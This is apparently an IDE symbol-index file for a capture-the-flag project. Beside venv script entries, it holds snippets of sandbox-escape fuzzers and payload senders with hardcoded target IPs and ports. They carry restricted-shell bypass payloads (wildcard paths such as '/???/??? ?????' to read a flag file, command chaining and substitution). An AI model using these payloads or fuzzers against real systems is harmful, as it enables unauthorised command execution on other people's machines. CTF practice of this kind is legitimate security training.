        "description": ".venv.Scripts.pywin32_testall",
        "peekOfCode": "def find_and_run(possible_locations, extras):\n    for maybe in possible_locations:\n        if os.path.isfile(maybe):\n            run_test(maybe, extras)\n            break\n    else:\n        raise RuntimeError(\n            \"Failed to locate a test script in one of %s\" % possible_locations\n        )\ndef main():",
        "detail": ".venv.Scripts.pywin32_testall",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".venv.Scripts.pywin32_testall",
        "description": ".venv.Scripts.pywin32_testall",
        "peekOfCode": "def main():\n    import argparse\n    code_directories = [project_root] + site_packages\n    parser = argparse.ArgumentParser(\n        description=\"A script to trigger tests in all subprojects of PyWin32.\"\n    )\n    parser.add_argument(\n        \"-no-user-interaction\",\n        default=False,\n        action=\"store_true\",",
        "detail": ".venv.Scripts.pywin32_testall",
        "documentation": {}
    },
    {
        "label": "project_root",
        "kind": 5,
        "importPath": ".venv.Scripts.pywin32_testall",
        "description": ".venv.Scripts.pywin32_testall",
        "peekOfCode": "project_root = os.path.dirname(os.path.dirname(os.path.dirname(__file__)))\nsite_packages = [site.getusersitepackages()] + site.getsitepackages()\nfailures = []\n# Run a test using subprocess and wait for the result.\n# If we get an returncode != 0, we know that there was an error, but we don't\n# abort immediately - we run as many tests as we can.\ndef run_test(script, cmdline_extras):\n    dirname, scriptname = os.path.split(script)\n    # some tests prefer to be run from their directory.\n    cmd = [sys.executable, \"-u\", scriptname] + cmdline_extras",
        "detail": ".venv.Scripts.pywin32_testall",
        "documentation": {}
    },
    {
        "label": "site_packages",
        "kind": 5,
        "importPath": ".venv.Scripts.pywin32_testall",
        "description": ".venv.Scripts.pywin32_testall",
        "peekOfCode": "site_packages = [site.getusersitepackages()] + site.getsitepackages()\nfailures = []\n# Run a test using subprocess and wait for the result.\n# If we get an returncode != 0, we know that there was an error, but we don't\n# abort immediately - we run as many tests as we can.\ndef run_test(script, cmdline_extras):\n    dirname, scriptname = os.path.split(script)\n    # some tests prefer to be run from their directory.\n    cmd = [sys.executable, \"-u\", scriptname] + cmdline_extras\n    print(\"--- Running '%s' ---\" % script)",
        "detail": ".venv.Scripts.pywin32_testall",
        "documentation": {}
    },
    {
        "label": "failures",
        "kind": 5,
        "importPath": ".venv.Scripts.pywin32_testall",
        "description": ".venv.Scripts.pywin32_testall",
        "peekOfCode": "failures = []\n# Run a test using subprocess and wait for the result.\n# If we get an returncode != 0, we know that there was an error, but we don't\n# abort immediately - we run as many tests as we can.\ndef run_test(script, cmdline_extras):\n    dirname, scriptname = os.path.split(script)\n    # some tests prefer to be run from their directory.\n    cmd = [sys.executable, \"-u\", scriptname] + cmdline_extras\n    print(\"--- Running '%s' ---\" % script)\n    sys.stdout.flush()",
        "detail": ".venv.Scripts.pywin32_testall",
        "documentation": {}
    },
    {
        "label": "ReadElf",
        "kind": 6,
        "importPath": ".venv.Scripts.readelf",
        "description": ".venv.Scripts.readelf",
        "peekOfCode": "class ReadElf(object):\n    \"\"\" display_* methods are used to emit output into the output stream\n    \"\"\"\n    def __init__(self, file, output):\n        \"\"\" file:\n                stream object with the ELF file to read\n            output:\n                output stream to write to\n        \"\"\"\n        self.elffile = ELFFile(file)",
        "detail": ".venv.Scripts.readelf",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".venv.Scripts.readelf",
        "description": ".venv.Scripts.readelf",
        "peekOfCode": "def main(stream=None):\n    # parse the command-line arguments and invoke ReadElf\n    argparser = argparse.ArgumentParser(\n            usage='usage: %(prog)s [options] <elf-file>',\n            description=SCRIPT_DESCRIPTION,\n            add_help=False, # -h is a real option of readelf\n            prog='readelf.py')\n    argparser.add_argument('file',\n            nargs='?', default=None,\n            help='ELF file to parse')",
        "detail": ".venv.Scripts.readelf",
        "documentation": {}
    },
    {
        "label": "profile_main",
        "kind": 2,
        "importPath": ".venv.Scripts.readelf",
        "description": ".venv.Scripts.readelf",
        "peekOfCode": "def profile_main():\n    # Run 'main' redirecting its output to readelfout.txt\n    # Saves profiling information in readelf.profile\n    PROFFILE = 'readelf.profile'\n    import cProfile\n    cProfile.run('main(open(\"readelfout.txt\", \"w\"))', PROFFILE)\n    # Dig in some profiling stats\n    import pstats\n    p = pstats.Stats(PROFFILE)\n    p.sort_stats('cumulative').print_stats(25)",
        "detail": ".venv.Scripts.readelf",
        "documentation": {}
    },
    {
        "label": "_CONTROL_CHAR_RE",
        "kind": 5,
        "importPath": ".venv.Scripts.readelf",
        "description": ".venv.Scripts.readelf",
        "peekOfCode": "_CONTROL_CHAR_RE = re.compile(r'[\\x01-\\x1f]')\ndef _format_symbol_name(s):\n    return _CONTROL_CHAR_RE.sub(lambda match: '^' + chr(0x40 + ord(match[0])), s)\nclass ReadElf(object):\n    \"\"\" display_* methods are used to emit output into the output stream\n    \"\"\"\n    def __init__(self, file, output):\n        \"\"\" file:\n                stream object with the ELF file to read\n            output:",
        "detail": ".venv.Scripts.readelf",
        "documentation": {}
    },
    {
        "label": "SCRIPT_DESCRIPTION",
        "kind": 5,
        "importPath": ".venv.Scripts.readelf",
        "description": ".venv.Scripts.readelf",
        "peekOfCode": "SCRIPT_DESCRIPTION = 'Display information about the contents of ELF format files'\nVERSION_STRING = '%%(prog)s: based on pyelftools %s' % __version__\ndef main(stream=None):\n    # parse the command-line arguments and invoke ReadElf\n    argparser = argparse.ArgumentParser(\n            usage='usage: %(prog)s [options] <elf-file>',\n            description=SCRIPT_DESCRIPTION,\n            add_help=False, # -h is a real option of readelf\n            prog='readelf.py')\n    argparser.add_argument('file',",
        "detail": ".venv.Scripts.readelf",
        "documentation": {}
    },
    {
        "label": "VERSION_STRING",
        "kind": 5,
        "importPath": ".venv.Scripts.readelf",
        "description": ".venv.Scripts.readelf",
        "peekOfCode": "VERSION_STRING = '%%(prog)s: based on pyelftools %s' % __version__\ndef main(stream=None):\n    # parse the command-line arguments and invoke ReadElf\n    argparser = argparse.ArgumentParser(\n            usage='usage: %(prog)s [options] <elf-file>',\n            description=SCRIPT_DESCRIPTION,\n            add_help=False, # -h is a real option of readelf\n            prog='readelf.py')\n    argparser.add_argument('file',\n            nargs='?', default=None,",
        "detail": ".venv.Scripts.readelf",
        "documentation": {}
    },
    {
        "label": "load_payloads",
        "kind": 2,
        "importPath": "archive.bash_sandbox_escape",
        "description": "archive.bash_sandbox_escape",
        "peekOfCode": "def load_payloads(modules, payloads_dir=\"payloads\"):\n    \"\"\"Loads payloads from specified module files.\"\"\"\n    all_payloads = []\n    for module in modules:\n        file_path = os.path.join(payloads_dir, f\"{module}.txt\")\n        if os.path.exists(file_path):\n            with open(file_path, 'r') as f:\n                all_payloads.extend([line.strip() for line in f if line.strip()])\n        else:\n            print(f\"Warning: Payload module '{module}' not found.\")",
        "detail": "archive.bash_sandbox_escape",
        "documentation": {}
    },
    {
        "label": "filter_payloads",
        "kind": 2,
        "importPath": "archive.bash_sandbox_escape",
        "description": "archive.bash_sandbox_escape",
        "peekOfCode": "def filter_payloads(payloads, regex):\n    \"\"\"Filters payloads based on the allowed character regex.\"\"\"\n    if not regex:\n        return payloads\n    allowed_chars_pattern = re.compile(regex)\n    filtered_payloads = [p for p in payloads if allowed_chars_pattern.fullmatch(p)]\n    return filtered_payloads\ndef main():\n    parser = argparse.ArgumentParser(description=\"BashSandboxEscape: Restricted shell fuzzer and enumerator.\")\n    parser.add_argument(\"--host\", required=True, help=\"Target host IP or hostname.\")",
        "detail": "archive.bash_sandbox_escape",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": "archive.bash_sandbox_escape",
        "description": "archive.bash_sandbox_escape",
        "peekOfCode": "def main():\n    parser = argparse.ArgumentParser(description=\"BashSandboxEscape: Restricted shell fuzzer and enumerator.\")\n    parser.add_argument(\"--host\", required=True, help=\"Target host IP or hostname.\")\n    parser.add_argument(\"--port\", required=True, type=int, help=\"Target port.\")\n    parser.add_argument(\"--regex\", help=\"Regex for allowed characters in payloads.\")\n    parser.add_argument(\"--modules\", default=\"env,files\", help=\"Comma-separated list of payload modules to use (e.g., env,files,redir).\")\n    parser.add_argument(\"--log\", help=\"Log results to a file.\")\n    parser.add_argument(\"--verbose\", action=\"store_true\", help=\"Enable verbose output.\")\n    args = parser.parse_args()\n    print(f\"[*] Loading payloads from modules: {args.modules}\")",
        "detail": "archive.bash_sandbox_escape",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": "archive.gpt",
        "description": "archive.gpt",
        "peekOfCode": "def send_payload(payload):\n    try:\n        with socket.create_connection((HOST, PORT), timeout=3) as s:\n            s.sendall(payload.encode() + b'\\n')\n            time.sleep(0.5)  # wait for response\n            response = s.recv(4096)\n            return response.decode(errors='ignore')\n    except Exception as e:\n        return f\"[ERROR] {e}\"\ndef main():",
        "detail": "archive.gpt",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": "archive.gpt",
        "description": "archive.gpt",
        "peekOfCode": "def main():\n    for payload in test_payloads:\n        print(f\"\\n[>>] Payload: {repr(payload)}\")\n        output = send_payload(payload)\n        print(f\"[<<] Response:\\n{output}\\n{'=' * 50}\")\nif __name__ == \"__main__\":\n    main()",
        "detail": "archive.gpt",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": "archive.gpt",
        "description": "archive.gpt",
        "peekOfCode": "HOST = '94.237.123.87'\nPORT = 44123\n# Payloads based on:\n# - Arithmetic expansion (to try implicit command execution)\n# - Wildcard probing (for guessing commands/paths)\n# - Leading space bypass (to bypass character filter)\n# - File descriptor redirection (to test output on higher FDs)\ntest_payloads = [\n    # Arithmetic expansions that yield numeric results (could trigger commands like `4`, `5`, `6`, etc.)\n    \" $((2+2))\", ",
        "detail": "archive.gpt",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": "archive.gpt",
        "description": "archive.gpt",
        "peekOfCode": "PORT = 44123\n# Payloads based on:\n# - Arithmetic expansion (to try implicit command execution)\n# - Wildcard probing (for guessing commands/paths)\n# - Leading space bypass (to bypass character filter)\n# - File descriptor redirection (to test output on higher FDs)\ntest_payloads = [\n    # Arithmetic expansions that yield numeric results (could trigger commands like `4`, `5`, `6`, etc.)\n    \" $((2+2))\", \n    \" $((3+2))\", ",
        "detail": "archive.gpt",
        "documentation": {}
    },
    {
        "label": "test_payloads",
        "kind": 5,
        "importPath": "archive.gpt",
        "description": "archive.gpt",
        "peekOfCode": "test_payloads = [\n    # Arithmetic expansions that yield numeric results (could trigger commands like `4`, `5`, `6`, etc.)\n    \" $((2+2))\", \n    \" $((3+2))\", \n    \" $((10-5))\", \n    \" $((6))\", \n    \" $((7))\", \n    \" $((8))\", \n    \" $((9))\", \n    \" $((10))\",",
        "detail": "archive.gpt",
        "documentation": {}
    },
    {
        "label": "load_payloads_from_directory",
        "kind": 2,
        "importPath": "archive.SandBox-Escape",
        "description": "archive.SandBox-Escape",
        "peekOfCode": "def load_payloads_from_directory(directory):\n    \"\"\"Loads payloads from all .txt files in a given directory.\"\"\"\n    all_payloads = []\n    for filename in os.listdir(directory):\n        if filename.endswith(\".txt\"):\n            filepath = os.path.join(directory, filename)\n            try:\n                with open(filepath, 'r') as f:\n                    payloads = [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]\n                    all_payloads.extend(payloads)",
        "detail": "archive.SandBox-Escape",
        "documentation": {}
    },
    {
        "label": "connect_to_service",
        "kind": 2,
        "importPath": "archive.SandBox-Escape",
        "description": "archive.SandBox-Escape",
        "peekOfCode": "def connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None\ndef send_payload(conn, payload):",
        "detail": "archive.SandBox-Escape",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": "archive.SandBox-Escape",
        "description": "archive.SandBox-Escape",
        "peekOfCode": "def send_payload(conn, payload):\n    \"\"\"Sends a single payload and returns the response.\"\"\"\n    try:\n        print(f\"\\n[+] Sending payload: {repr(payload)}\")\n        conn.sendline(payload.encode())\n        time.sleep(0.5)  # Small delay to allow server to process\n        response = conn.recv(timeout=2).decode()\n        if response:\n            print(\"[*] Response:\")\n            print(response)",
        "detail": "archive.SandBox-Escape",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": "archive.SandBox-Escape",
        "description": "archive.SandBox-Escape",
        "peekOfCode": "def main(args):\n    \"\"\"Main function to run the bashpoke tool.\"\"\"\n    conn = connect_to_service(args.host, args.port)\n    if not conn:\n        return\n    try:\n        # Print initial banner\n        print(\"[+] Initial response:\")\n        initial_response = conn.recv().decode()\n        print(initial_response)",
        "detail": "archive.SandBox-Escape",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": "archive.SandBox-Escape",
        "description": "archive.SandBox-Escape",
        "peekOfCode": "HOST = \"94.237.123.126\" # <--- Change this\nPORT = 34445 # <--- Change this\nimport os\nimport argparse\n# Allowed characters based on regex provided: ^[0-9${}/?\"[:space:]:&>_=()]+\ndef load_payloads_from_directory(directory):\n    \"\"\"Loads payloads from all .txt files in a given directory.\"\"\"\n    all_payloads = []\n    for filename in os.listdir(directory):\n        if filename.endswith(\".txt\"):",
        "detail": "archive.SandBox-Escape",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": "archive.SandBox-Escape",
        "description": "archive.SandBox-Escape",
        "peekOfCode": "PORT = 34445 # <--- Change this\nimport os\nimport argparse\n# Allowed characters based on regex provided: ^[0-9${}/?\"[:space:]:&>_=()]+\ndef load_payloads_from_directory(directory):\n    \"\"\"Loads payloads from all .txt files in a given directory.\"\"\"\n    all_payloads = []\n    for filename in os.listdir(directory):\n        if filename.endswith(\".txt\"):\n            filepath = os.path.join(directory, filename)",
        "detail": "archive.SandBox-Escape",
        "documentation": {}
    },
    {
        "label": "payloads",
        "kind": 5,
        "importPath": "archive.SandBox-Escape",
        "description": "archive.SandBox-Escape",
        "peekOfCode": "payloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$0\",                      # Current shell\n    \"$PATH\",                   # PATH environment variable\n    \"$PWD\",                    # Current directory\n    \"$HOME\",                   # Home directory\n    \"$SHELL\",                  # Shell type\n    \"$USER\",                   # Current user",
        "detail": "archive.SandBox-Escape",
        "documentation": {}
    },
    {
        "label": "connect_to_service",
        "kind": 2,
        "importPath": "archive.sandbox_buster",
        "description": "archive.sandbox_buster",
        "peekOfCode": "def connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None\ndef send_payload(conn, payload):",
        "detail": "archive.sandbox_buster",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": "archive.sandbox_buster",
        "description": "archive.sandbox_buster",
        "peekOfCode": "def send_payload(conn, payload):\n    \"\"\"Sends a single payload and returns the response.\"\"\"\n    try:\n        print(f\"\\n[+] Sending payload: {repr(payload)}\")\n        conn.sendline(payload.encode())\n        # Increased timeout to allow for potentially longer execution times\n        response = conn.recv(timeout=10).decode(errors='ignore')\n        if response:\n            print(\"[*] Response:\")\n            print(response)",
        "detail": "archive.sandbox_buster",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": "archive.sandbox_buster",
        "description": "archive.sandbox_buster",
        "peekOfCode": "def main():\n    \"\"\"Main function to run the sandbox buster.\"\"\"\n    conn = connect_to_service(HOST, PORT)\n    if not conn:\n        sys.exit(1)\n    try:\n        # Print initial banner\n        print(\"[+] Initial response:\")\n        initial_response = conn.recv().decode(errors='ignore')\n        print(initial_response)",
        "detail": "archive.sandbox_buster",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": "archive.sandbox_buster",
        "description": "archive.sandbox_buster",
        "peekOfCode": "HOST = \"94.237.123.126\"\nPORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:",
        "detail": "archive.sandbox_buster",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": "archive.sandbox_buster",
        "description": "archive.sandbox_buster",
        "peekOfCode": "PORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")",
        "detail": "archive.sandbox_buster",
        "documentation": {}
    },
    {
        "label": "ALLOWED_CHARS",
        "kind": 5,
        "importPath": "archive.sandbox_buster",
        "description": "archive.sandbox_buster",
        "peekOfCode": "ALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None",
        "detail": "archive.sandbox_buster",
        "documentation": {}
    },
    {
        "label": "recv_until_prompt",
        "kind": 2,
        "importPath": "archive.send_payload.",
        "description": "archive.send_payload.",
        "peekOfCode": "def recv_until_prompt(s, prompt):\n    buffer = b\"\"\n    while prompt not in buffer:\n        data = s.recv(4096)\n        if not data:\n            break\n        buffer += data\n    return buffer\ntry:\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:",
        "detail": "archive.send_payload.",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": "archive.send_payload.",
        "description": "archive.send_payload.",
        "peekOfCode": "HOST = \"94.237.123.126\"\nPORT = 34445\n# Payload to read flag.txt using wildcard expansion\npayload = \"/???/??? ?????\"\n# Prompt to wait for before sending the payload\nPROMPT = b\"Broken@Shell$ \"\ndef recv_until_prompt(s, prompt):\n    buffer = b\"\"\n    while prompt not in buffer:\n        data = s.recv(4096)",
        "detail": "archive.send_payload.",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": "archive.send_payload.",
        "description": "archive.send_payload.",
        "peekOfCode": "PORT = 34445\n# Payload to read flag.txt using wildcard expansion\npayload = \"/???/??? ?????\"\n# Prompt to wait for before sending the payload\nPROMPT = b\"Broken@Shell$ \"\ndef recv_until_prompt(s, prompt):\n    buffer = b\"\"\n    while prompt not in buffer:\n        data = s.recv(4096)\n        if not data:",
        "detail": "archive.send_payload.",
        "documentation": {}
    },
    {
        "label": "payload",
        "kind": 5,
        "importPath": "archive.send_payload.",
        "description": "archive.send_payload.",
        "peekOfCode": "payload = \"/???/??? ?????\"\n# Prompt to wait for before sending the payload\nPROMPT = b\"Broken@Shell$ \"\ndef recv_until_prompt(s, prompt):\n    buffer = b\"\"\n    while prompt not in buffer:\n        data = s.recv(4096)\n        if not data:\n            break\n        buffer += data",
        "detail": "archive.send_payload.",
        "documentation": {}
    },
    {
        "label": "PROMPT",
        "kind": 5,
        "importPath": "archive.send_payload.",
        "description": "archive.send_payload.",
        "peekOfCode": "PROMPT = b\"Broken@Shell$ \"\ndef recv_until_prompt(s, prompt):\n    buffer = b\"\"\n    while prompt not in buffer:\n        data = s.recv(4096)\n        if not data:\n            break\n        buffer += data\n    return buffer\ntry:",
        "detail": "archive.send_payload.",
        "documentation": {}
    },
    {
        "label": "recv_until_prompt",
        "kind": 2,
        "importPath": "archive.send_payload",
        "description": "archive.send_payload",
        "peekOfCode": "def recv_until_prompt(s, prompt):\n    buffer = b\"\"\n    while prompt not in buffer:\n        data = s.recv(4096)\n        if not data:\n            break\n        buffer += data\n    return buffer\ntry:\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:",
        "detail": "archive.send_payload",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": "archive.send_payload",
        "description": "archive.send_payload",
        "peekOfCode": "HOST = \"94.237.123.126\"\nPORT = 34445\n# Payload to read flag.txt using wildcard expansion\npayload = \"/???/??? ?????\"\n# Prompt to wait for before sending the payload\nPROMPT = b\"Broken@Shell$ \"\ndef recv_until_prompt(s, prompt):\n    buffer = b\"\"\n    while prompt not in buffer:\n        data = s.recv(4096)",
        "detail": "archive.send_payload",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": "archive.send_payload",
        "description": "archive.send_payload",
        "peekOfCode": "PORT = 34445\n# Payload to read flag.txt using wildcard expansion\npayload = \"/???/??? ?????\"\n# Prompt to wait for before sending the payload\nPROMPT = b\"Broken@Shell$ \"\ndef recv_until_prompt(s, prompt):\n    buffer = b\"\"\n    while prompt not in buffer:\n        data = s.recv(4096)\n        if not data:",
        "detail": "archive.send_payload",
        "documentation": {}
    },
    {
        "label": "payload",
        "kind": 5,
        "importPath": "archive.send_payload",
        "description": "archive.send_payload",
        "peekOfCode": "payload = \"/???/??? ?????\"\n# Prompt to wait for before sending the payload\nPROMPT = b\"Broken@Shell$ \"\ndef recv_until_prompt(s, prompt):\n    buffer = b\"\"\n    while prompt not in buffer:\n        data = s.recv(4096)\n        if not data:\n            break\n        buffer += data",
        "detail": "archive.send_payload",
        "documentation": {}
    },
    {
        "label": "PROMPT",
        "kind": 5,
        "importPath": "archive.send_payload",
        "description": "archive.send_payload",
        "peekOfCode": "PROMPT = b\"Broken@Shell$ \"\ndef recv_until_prompt(s, prompt):\n    buffer = b\"\"\n    while prompt not in buffer:\n        data = s.recv(4096)\n        if not data:\n            break\n        buffer += data\n    return buffer\ntry:",
        "detail": "archive.send_payload",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": "payloads.test_payloads",
        "description": "payloads.test_payloads",
        "peekOfCode": "HOST = '83.136.252.13'\nPORT = 39615\n# Read payloads from not_tested.txt\npayloads = []\ntry:\n    with open('not_tested.txt', 'r') as f:\n        for line in f:\n            line = line.strip()\n            if line and not line.startswith('#'):\n                payloads.append({\"payload\": line, \"tested\": False})",
        "detail": "payloads.test_payloads",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": "payloads.test_payloads",
        "description": "payloads.test_payloads",
        "peekOfCode": "PORT = 39615\n# Read payloads from not_tested.txt\npayloads = []\ntry:\n    with open('not_tested.txt', 'r') as f:\n        for line in f:\n            line = line.strip()\n            if line and not line.startswith('#'):\n                payloads.append({\"payload\": line, \"tested\": False})\nexcept FileNotFoundError:",
        "detail": "payloads.test_payloads",
        "documentation": {}
    },
    {
        "label": "payloads",
        "kind": 5,
        "importPath": "payloads.test_payloads",
        "description": "payloads.test_payloads",
        "peekOfCode": "payloads = []\ntry:\n    with open('not_tested.txt', 'r') as f:\n        for line in f:\n            line = line.strip()\n            if line and not line.startswith('#'):\n                payloads.append({\"payload\": line, \"tested\": False})\nexcept FileNotFoundError:\n    print(\"Error: not_tested.txt file not found\")\n    sys.exit(1)",
        "detail": "payloads.test_payloads",
        "documentation": {}
    },
    {
        "label": "tested_payloads",
        "kind": 5,
        "importPath": "payloads.test_payloads",
        "description": "payloads.test_payloads",
        "peekOfCode": "tested_payloads = []\nif os.path.exists('tested.json'):\n    try:\n        with open('tested.json', 'r') as f:\n            tested_payloads = json.load(f)\n    except json.JSONDecodeError:\n        print(\"Warning: tested.json exists but is not valid JSON. Creating new file.\")\n# Create a TCP socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.settimeout(5)  # Set timeout for connections",
        "detail": "payloads.test_payloads",
        "documentation": {}
    },
    {
        "label": "sock",
        "kind": 5,
        "importPath": "payloads.test_payloads",
        "description": "payloads.test_payloads",
        "peekOfCode": "sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.settimeout(5)  # Set timeout for connections\nfor i, payload in enumerate(payloads):\n    try:\n        # Connect to server\n        sock.connect((HOST, PORT))\n        # Send payload\n        sock.sendall(payload['payload'].encode('utf-8'))\n        # Receive response\n        response = sock.recv(1024).decode('utf-8', errors='ignore')",
        "detail": "payloads.test_payloads",
        "documentation": {}
    },
    {
        "label": "connect_to_service",
        "kind": 2,
        "importPath": "advanced_exploit",
        "description": "advanced_exploit",
        "peekOfCode": "def connect_to_service():\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(10)\n        sock.connect((HOST, PORT))\n        print(f\"[+] Connected to {HOST}:{PORT}\")\n        # Receive initial banner\n        banner = sock.recv(4096).decode('utf-8', errors='ignore')\n        print(\"[+] Banner received:\")",
        "detail": "advanced_exploit",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": "advanced_exploit",
        "description": "advanced_exploit",
        "peekOfCode": "def send_payload(sock, payload):\n    \"\"\"Sends a single payload and returns the response.\"\"\"\n    try:\n        print(f\"\\n[+] Sending payload: {repr(payload)}\")\n        sock.sendall((payload + '\\n').encode())\n        time.sleep(1)  # Give the server time to respond\n        # Receive response\n        response = sock.recv(4096).decode('utf-8', errors='ignore')\n        print(\"[*] Response:\")\n        print(response)",
        "detail": "advanced_exploit",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": "advanced_exploit",
        "description": "advanced_exploit",
        "peekOfCode": "def main():\n    \"\"\"Main function to run the advanced exploit payloads.\"\"\"\n    results = []\n    sock = connect_to_service()\n    if not sock:\n        sys.exit(1)\n    try:\n        for i, payload in enumerate(advanced_payloads):\n            print(f\"\\n[*] Testing payload {i+1}/{len(advanced_payloads)}\")\n            result = send_payload(sock, payload)",
        "detail": "advanced_exploit",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": "advanced_exploit",
        "description": "advanced_exploit",
        "peekOfCode": "HOST = \"94.237.123.87\"\nPORT = 44123\n# Advanced exploit payloads\nadvanced_payloads = [\n    # Command chaining with semicolons (if allowed)\n    \"/???/?? ; $?\",                   # Try to chain commands\n    \"/???/?? ; $$\",                   # Try to chain commands\n    \"/???/?? ; $0\",                   # Try to chain commands\n    # Command substitution with different syntax\n    \"$(/???/??)\",                     # Command substitution with /bin/cp",
        "detail": "advanced_exploit",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": "advanced_exploit",
        "description": "advanced_exploit",
        "peekOfCode": "PORT = 44123\n# Advanced exploit payloads\nadvanced_payloads = [\n    # Command chaining with semicolons (if allowed)\n    \"/???/?? ; $?\",                   # Try to chain commands\n    \"/???/?? ; $$\",                   # Try to chain commands\n    \"/???/?? ; $0\",                   # Try to chain commands\n    # Command substitution with different syntax\n    \"$(/???/??)\",                     # Command substitution with /bin/cp\n    \"$(/???/?)\",                      # Command substitution with /bin/[",
        "detail": "advanced_exploit",
        "documentation": {}
    },
    {
        "label": "advanced_payloads",
        "kind": 5,
        "importPath": "advanced_exploit",
        "description": "advanced_exploit",
        "peekOfCode": "advanced_payloads = [\n    # Command chaining with semicolons (if allowed)\n    \"/???/?? ; $?\",                   # Try to chain commands\n    \"/???/?? ; $$\",                   # Try to chain commands\n    \"/???/?? ; $0\",                   # Try to chain commands\n    # Command substitution with different syntax\n    \"$(/???/??)\",                     # Command substitution with /bin/cp\n    \"$(/???/?)\",                      # Command substitution with /bin/[\n    \"$(/???/???)\",                    # Command substitution with /bin/awk\n    # Using environment variables",
        "detail": "advanced_exploit",
        "documentation": {}
    },
    {
        "label": "connect_to_service",
        "kind": 2,
        "importPath": "custom_payloads",
        "description": "custom_payloads",
        "peekOfCode": "def connect_to_service():\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(10)\n        sock.connect((HOST, PORT))\n        print(f\"[+] Connected to {HOST}:{PORT}\")\n        # Receive initial banner\n        banner = sock.recv(4096).decode('utf-8', errors='ignore')\n        print(\"[+] Banner received:\")",
        "detail": "custom_payloads",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": "custom_payloads",
        "description": "custom_payloads",
        "peekOfCode": "def send_payload(sock, payload):\n    \"\"\"Sends a single payload and returns the response.\"\"\"\n    try:\n        print(f\"\\n[+] Sending payload: {repr(payload)}\")\n        sock.sendall((payload + '\\n').encode())\n        time.sleep(1)  # Give the server time to respond\n        # Receive response\n        response = sock.recv(4096).decode('utf-8', errors='ignore')\n        print(\"[*] Response:\")\n        print(response)",
        "detail": "custom_payloads",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": "custom_payloads",
        "description": "custom_payloads",
        "peekOfCode": "def main():\n    \"\"\"Main function to run the custom payloads.\"\"\"\n    results = []\n    sock = connect_to_service()\n    if not sock:\n        sys.exit(1)\n    try:\n        for i, payload in enumerate(custom_payloads):\n            print(f\"\\n[*] Testing payload {i+1}/{len(custom_payloads)}\")\n            result = send_payload(sock, payload)",
        "detail": "custom_payloads",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": "custom_payloads",
        "description": "custom_payloads",
